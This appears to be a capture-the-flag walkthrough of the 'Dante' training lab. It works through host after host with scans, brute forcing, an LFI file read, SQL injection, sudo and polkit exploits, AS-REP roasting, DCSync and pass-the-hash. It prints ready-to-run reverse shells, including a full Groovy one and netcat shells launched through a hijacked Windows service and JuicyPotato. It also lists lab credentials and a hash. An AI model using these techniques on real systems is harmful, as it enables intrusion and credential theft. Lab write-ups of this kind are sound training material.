# Dante

## DANTE-WEB-NIX01

Ping sweep to find the machines

```
nmap -sn -T4 10.10.110.0/24
```

Full scan on the found host **10.10.110.100**

```
nmap -T4 -sC -sV -p- --min-rate=1000 10.10.110.100
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

Login on ftp as anonymous to found **todo.txt** inside

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

Inside [**http://10.10.110.100:65000/robots.txt**](http://10.10.110.100:65000/robots.txt) there is another flag and a wordpress link

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

With wpscan we can see that there are some vulns

```
wpscan --url 'http://10.10.110.100:65000/wordpress/'
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

And the users

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Now we can try to bruteforce the weak james password

{% code overflow="wrap" %}
```
wpscan --url 'http://10.10.110.100:65000/wordpress/' --passwords /usr/share/wordlists/rockyou.txt
```
{% endcode %}

The creds are James/Toyota. Now modify the theme to get a web shell and then a revshell.

Now we can escalate to James by using the same password from wp (Toyota)

```
su James
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Find has SUID on it

```
./find . -exec /bin/sh -p \; -quit
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

Grab the shh root key

## Pivoting

(Simple with ssh -d 9050 )&#x20;

Setup metasploit to pivot throught the network

Upgrade the root ssh to meterpreter session and launch the following commands

```
use multi/manage/autoroute
set session 3
set subnet 172.16.1.0/24
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

Then We will use **auxiliary/server/socks\_proxy** to create a proxy server which will allow us to proxy all our traffic from tools like nmap, crackmapexec etc within the meterpreter session.

```
use auxiliary/server/socks_proxy
set SRVPORT 9050
```

and then modify the file `/etc/proxychains4.conf`



To find other ips in the subnet use the module&#x20;

```
use post/multi/gather/ping_sweep
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

## DANTE-NIX02

To run nmap throught proxychains

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

Now open firefox with proxychains

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

As expected there is an LFI in the `nav.php?page=` endpoint

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

On the SMB

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### Margaret

Bruteforce the password with the user found with the LFI

{% code overflow="wrap" %}
```
proxychains crackmapexec smb 172.16.1.10 -u user.txt -p /usr/share/wordlists/rockyou.txt
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

and get the file inside

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

Let's check if wordress is indeed there (Spoiler: Yes) and try to get the wp-config file

{% code overflow="wrap" %}
```
http://172.16.1.10/nav.php?page=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Now we have ssh access on 172.16.1.10 with a restricted shellls. To escape and get a full shell open vim and launch the following commands

```
:set shell=/bin/bash
:shell
```

On the frank home we find a slack report and some interesting password

* STARS5678FORTUNE401
* 69F15HST1CX
* TractorHeadtorchDeskmat

Now i can su to Franck

### Frank

In the home of frank there is apache\_restart.py.

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

We can hijack the library urllib by creating it inside the frank's home and let it create a new SUID sh

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

## DANTE-NIX03&#x20;

scan the ports

```
proxychains nmap 172.16.1.10 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

On the webpage there is a directory listing

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Inside the smbclient we found a file named "Monitor", a wireshark log.

Inside it can be found the credentials for webmin = admin:Password6543

using the script we can get a reverse shell

[https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin\_exploit.py](https://raw.githubusercontent.com/lucas31oct/Webmin-1.910-Exploit-Script/refs/heads/stable/webmin\_exploit.py)

{% code overflow="wrap" %}
```
proxychains python3 webmin_exploit.py --rhost 172.16.1.17 --rport 10000 --lhost 172.16.1.100 --lport 4444 -u admin -p Password6543
```
{% endcode %}

already root

## NT DANTE-WS01

scan the ports

```
proxychains nmap 172.16.1.13 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

On the web server there is xampp. By enumerating the directories we can find /discuss

<figure><img src="../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

If you register can upload a php reverse shell and reach it throught the /ups/webshell.php

<figure><img src="../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Upload nc64.exe, invoke a reverse shell and use powerup.ps1 to find a misconfiguration

<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>

Druva [https://www.exploit-db.com/exploits/49211](https://www.exploit-db.com/exploits/49211)

## DANTE-NIX04

scan the ports

```
proxychains nmap 172.16.1.12 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

Found /blog

SQL injection [https://www.exploit-db.com/exploits/48615](https://www.exploit-db.com/exploits/48615)

```
sqlmap -u "http://172.16.1.12/blog/category.php?id=1*" --batch -D flag --dump
```

<figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

with

{% code overflow="wrap" %}
```
sqlmap -u "http://172.16.1.12/blog/category.php?id=1*" --batch -D blog_admin_db -T membership_users --dump
```
{% endcode %}

we can find some credentials

| Username | Password        |
| -------- | --------------- |
| ben      | Welcometomyblog |
| egre55   | egre55          |

we can access ftp with the ben credential and also ssh

By doing `sudo -l` we can see that we can run /bin/bash as all users except root

<figure><img src="../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

but the version is vulnerable to this exploit  [https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

```py
sudo -u#-1 /bin/bash
```

so now we are root

## DANTE-WS03

scan the ports

```
proxychains nmap 172.16.1.102 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

On the website we can found OMRS that is vulnerable [https://www.exploit-db.com/exploits/49557](https://www.exploit-db.com/exploits/49557)

```
python3 omrs.py -u http://172.16.1.102:80/ -c 'whoami'
```

<figure><img src="../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

Open a reverse shell and take the flag

Use metasploit `getsystem` command to take the admin account

## DANTE-DC01

scan the ports

```
proxychains nmap 172.16.1.20 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vulnerable to eternalblue

<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

I also found a file with this credentials

<table><thead><tr><th width="232">Usernames</th><th width="180">Passwords</th></tr></thead><tbody><tr><td>smoggat</td><td>Summer2019</td></tr><tr><td>tmodle</td><td>P45678!</td></tr><tr><td>ccraven</td><td>Password1</td></tr><tr><td>kploty</td><td>Teacher65</td></tr><tr><td>jbercov</td><td>4567Holiday1</td></tr><tr><td>whaguey</td><td>acb123</td></tr><tr><td>dcamtan</td><td>WorldOfWarcraft67</td></tr><tr><td>tspadly</td><td>RopeBlackfieldForwardslash</td></tr><tr><td>ematlis</td><td>JuneJuly1TY</td></tr><tr><td>fglacdon</td><td>FinalFantasy7</td></tr><tr><td>tmentrso</td><td>65RedBalloons</td></tr><tr><td>dharding</td><td>WestminsterOrange5</td></tr><tr><td>smillar</td><td>MarksAndSparks91</td></tr><tr><td>bjohnston</td><td>Bullingdon1</td></tr><tr><td>iahmed</td><td>Sheffield23</td></tr><tr><td>plongbottom</td><td>PowerfixSaturdayClub777</td></tr><tr><td>jcarrot</td><td>Tanenbaum0001</td></tr><tr><td>lgesley</td><td>SuperStrongCantForget123456789</td></tr><tr><td>asmith</td><td>Princess1</td></tr><tr><td>mrb3n</td><td>S3kur1ty2020!</td></tr></tbody></table>

## DANTE-WS02

scan the ports

```
proxychains nmap 172.16.1.101 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

Try to bruteforce ftp

```
hydra -L user.txt -P pass.txt ftp://172.16.1.101
```

This identified valid credentials. We can login to FTP using dharding : WestminsterOrange5 .

We found a file inside called "Remote login.txt"

<figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we need to try different password for smb and try to see

```
crackmapexec winrm 172.16.1.101 -u 'dharding' -p words.txt
```

<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

Once logging on we found out that there is IObit vulnerable (9.5) [https://www.exploit-db.com/exploits/48543](https://www.exploit-db.com/exploits/48543)

```
sc.exe qc IObitUnSvr
```

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

With winpeas we can also see something interesting

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

So exploit it

{% code overflow="wrap" %}
```
sc.exe config IObitUnSvr binPath="cmd.exe /c C:/Users/dharding/Documents/nc.exe -e cmd.exe 171.16.1.100 4444"
```
{% endcode %}

```
sc.exe stop IObitUnSvr
sc.exe start IObitUnSvr
```

## DANTE-DC02

Apparently there is another subnet, without any sense

Add the autoroute in metasploit

```
run autoroute -s 172.16.2.0/24
```

and run nmap against the new host with `scanner/portscan/tcp`

<figure><img src="../.gitbook/assets/image (14) (1) (1).png" alt=""><figcaption></figcaption></figure>

Try to enumerate users with krebrute using the previous wordlist

```
/kerbrute userenum -d dante --dc 172.16.2.5 user.txt
```

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Asperoast the user to get the ticket and crack it offline

{% code overflow="wrap" %}
```
impacket-GetNPUsers 'dante/jbercov' -no-pass -format hashcat -outputfile hash -dc-ip 172.16.2.5
```
{% endcode %}

The password is `myspace7`

From bloodhound we can see that jbercov has the ability to DCSync the domain, so we can dump all the hashes

```
impacket-secretsdump 'dante/jbercov':myspace7@172.16.2.5
```

<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

now we can login to the dc as administrator

```
evil-winrm -u 'Administrator' -H '4c827b7074e99eefd49d05872185f7f8' -i 172.16.2.5
```

in documents we find jenkins.bat that give us some credentials

Admin\_129834765:SamsungOctober102030

## DANTE-NIX7

Let's enumerate some ports

```
proxychains nmap -Pn -sT -sV -T5 172.16.1.19
```

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

On the :8080 using the creds found previously we can log in on jenkins ad admin

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

on /script we can launch the following groovy reverse shell to get a foothold

{% code overflow="wrap" %}
```
String host="172.16.1.100";
int port=4455;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

```
{% endcode %}

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Using pspy we can found a pair of credentials for ian that we can use to su (VPN123ZXC)

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

ian is part of `disk` group that can be exploited to read all files on the system

```
debugfs /dev/sda5
cat root/flag.txt
```

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

## DANTE-ADMIN-NIX5

The host is only reachable through dc02

Let's enumerate ports

```
nmap -Pn -sT -sV -T5 172.16.2.101
```

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Let's try to bruteforce SSH

```
hydra -L user.txt -P pass.txt 172.16.2.101 ssh -t 4
```

the credentials are those from nix4 (julian:manchesterunited)

Use [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation) polkit exploit privesc to obtain root

## ADMIN-NIX-6

Another machine found reachable only from ADMIN-NIX-5

```
nmap -Pn -sT -sV -T5 172.16.2.6 
```

Only ssh open with the same credentials of julian

We found in the desktop a text file regarding Sophie password change in `TerrorInflictPurpleDirt996655`.

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

Let's switch to the user plongbottom with the password found on DC01

he has sudo as root on everithing so just execute bash as root to pwn the system

```
sudo bash
```

## DANTE-SQL01

scan the ports

```
proxychains nmap 172.16.1.5 -sT -sV -Pn -T5
```

<figure><img src="../.gitbook/assets/image (13) (1) (1).png" alt=""><figcaption></figcaption></figure>

Flag inside ftp with anonymous login

You can access to sql using the credentials found on ADMIN-NIX6

```
impacket-mssqlclient dante/sophie@172.16.1.5
```

we have admin rights and can launch system commands

```
exec master..xp_cmdshell 'whoami'
```

<figure><img src="../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

In C:\DB\_backups we found a file named db\_backups.ps1 with inside the sophie password

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

sophie:Alltheleavesarebrown1

login with evil-winrm

```
evil-winrm -u 'sophie' -p 'Alltheleavesarebrown1' -i 172.16.1.5 -s Tools/CRTE/
```

sophie has vulnerable privileges

<figure><img src="../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

use juicypotato

{% code overflow="wrap" %}
```
./juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "cmd.exe /c c:\users\sophie\nc64.exe -e cmd.exe 172.16.1.100 9999" -t * -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}"
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
